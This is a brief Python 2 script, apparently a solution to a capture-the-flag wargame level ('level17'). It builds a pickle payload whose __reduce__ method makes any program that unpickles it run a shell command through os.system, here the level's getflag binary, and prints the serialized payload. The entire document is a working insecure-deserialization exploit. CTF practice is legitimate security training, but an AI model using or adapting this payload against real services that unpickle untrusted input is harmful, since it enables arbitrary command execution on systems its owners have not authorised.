import os
import pickle


class Malicious(object):
    def __reduce__(self):
        return (os.system, ('/home/level17/getflag ',))

shellcode = pickle.dumps(Malicious())
print shellcode